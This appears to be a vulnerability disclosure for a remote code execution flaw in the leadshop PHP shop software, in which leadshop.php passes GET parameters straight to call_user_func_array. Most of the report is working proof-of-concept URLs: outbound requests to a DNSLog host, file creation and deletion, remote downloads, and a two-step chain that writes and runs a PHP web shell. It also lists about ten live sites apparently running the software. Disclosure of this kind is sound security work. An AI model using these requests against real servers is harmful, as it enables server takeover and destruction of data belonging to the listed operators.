There is an RCE vulnerability in qmpaas/leadshop(https://github.com/qmpaas/leadshop )
-
Description
-
There is an RCE vulnerability in qmpaas/leadshop (https://github.com/qmpaas/leadshop) (v1.4.15). An attacker can access the file leadshop.php and call any existing function through GET to control the target host.  
The vulnerability is in the leadshop/web/leadshop.php[27-61] file  
（https://github.com/qmpaas/leadshop/blob/42de4233357671b96b18f8c8b2f1d7a74a809755/web/leadshop.php#L27 ）
  ```shell script
 public function run()  
    {  
        $include = isset($_GET['include']) ? $_GET['include'] : "";  
        $data    = isset($_GET['data']) ? $_GET['data'] : "";  
        $meta    = isset($_GET['meta']) ? $_GET['meta'] : "";  
        if ($include) {  
            return call_user_func_array([$this, $include], [$meta, $data]);  
……
```
The `call_user_func_array` function is used directly, and $include, $data, and $meta receive get parameters, which allows us to run all functions in this file (parameters less than or equal to 2), such as:  
HttpGet (http access: poc: `https://demo.leadshop.vip/leadshop.php?include=HttpGet&meta=6nup69.dnslog.cn`),  
ToMkdir (Create a file with content 1 and file name 1: poc: `https://demo.leadshop.vip/leadshop.php?include=ToMkdir&meta=1&data=1`),  
UpdateSql (perform database update: poc: `https://demo.leadshop.vip/leadshop.php?include=UpdateSql`),  
DownloadFile (download file: poc: 
`https://demo.leadshop.vip/leadshop.php?include=DownloadFile&meta=www.baidu.com/img/flexible/logo/pc/peak-result.png`),  
RemoveDir (remove directory: poc: 
`https://demo.leadshop.vip/leadshop.php?include=RemoveDir&meta=[path]`)  
-
Proof of Concept:
-
Poc：
(This url is applied from DNSLog(http://dnslog.cn/) in advance. Click "Get SubDomain", access the poc, and click "Refresh Record" to Refresh.)  
  ```shell script
https://demo.leadshop.vip/leadshop.php?include=HttpGet&meta=6nup69.dnslog.cn  
```
DNSLog picture:  
![img](DNSLog.png)

  ```shell script
http://example.org/leadshop.php?include=ToMkdir&meta=orobos.php&data=1
```
file picture:  
![img](tomkdir.PNG)

step 1:
  ```shell script
http://192.168.24.129/leadshop.php?include=ToMkdir&meta=/web/orobos.php&data=%3C?php%20system(%27ls%27)%20?%3E
```
step 2:
  ```shell script
http://192.168.24.129/orobos.php
```
![img](upload_trojans.PNG)
-
Impact
-
Attackers can call any existing functions at will, control the target server to access, download, create files, delete files, etc.  
Access may make the server a dos server.  
Download, so that an attacker can download the PHP Trojan to the server.  
Creating and deleting will destroy normal services.  
More than ten IPs are using this service(Fofa Search:"Powered By Leadshop © 2021").  
  ```shell script
https://8.141.175.3
http://www.huatianlinye.com
https://39.107.102.163
https://42.193.253.224
https://store.mianhuain.com
http://shop.yongzhitang.com
https://101.201.209.92
http://119.3.229.175:7788
https://101.200.231.65
https://zhangtong.store.mianhuain.com
```
-
Occurrences
-
https://github.com/qmpaas/leadshop/blob/42de4233357671b96b18f8c8b2f1d7a74a809755/web/leadshop.php#L27
https://github.com/qmpaas/leadshop/blob/42de4233357671b96b18f8c8b2f1d7a74a809755/web/leadshop.php#L35
https://github.com/qmpaas/leadshop/blob/42de4233357671b96b18f8c8b2f1d7a74a809755/web/leadshop.php#L103
https://github.com/qmpaas/leadshop/blob/42de4233357671b96b18f8c8b2f1d7a74a809755/web/leadshop.php#L304
https://github.com/qmpaas/leadshop/blob/42de4233357671b96b18f8c8b2f1d7a74a809755/web/leadshop.php#L328
https://github.com/qmpaas/leadshop/blob/42de4233357671b96b18f8c8b2f1d7a74a809755/web/leadshop.php#L349
https://github.com/qmpaas/leadshop/blob/42de4233357671b96b18f8c8b2f1d7a74a809755/web/leadshop.php#L395
https://github.com/qmpaas/leadshop/blob/42de4233357671b96b18f8c8b2f1d7a74a809755/web/leadshop.php#L444
https://github.com/qmpaas/leadshop/blob/42de4233357671b96b18f8c8b2f1d7a74a809755/web/leadshop.php#L477
https://github.com/qmpaas/leadshop/blob/42de4233357671b96b18f8c8b2f1d7a74a809755/web/leadshop.php#L495
https://github.com/qmpaas/leadshop/blob/42de4233357671b96b18f8c8b2f1d7a74a809755/web/leadshop.php#L509